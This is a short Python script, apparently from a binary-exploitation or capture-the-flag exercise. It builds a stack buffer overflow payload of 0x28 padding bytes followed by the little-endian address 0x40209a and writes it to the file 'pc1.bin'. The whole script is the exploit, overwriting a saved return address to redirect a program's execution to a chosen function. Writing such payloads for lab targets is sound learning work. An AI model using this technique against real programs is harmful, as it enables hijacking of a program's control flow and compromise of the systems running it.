# 0x40209a
payload = b'a' * 0x28 + b'\x9a\x20\x40\x00'

with open('pc1.bin', 'wb') as f:
  f.write(payload)
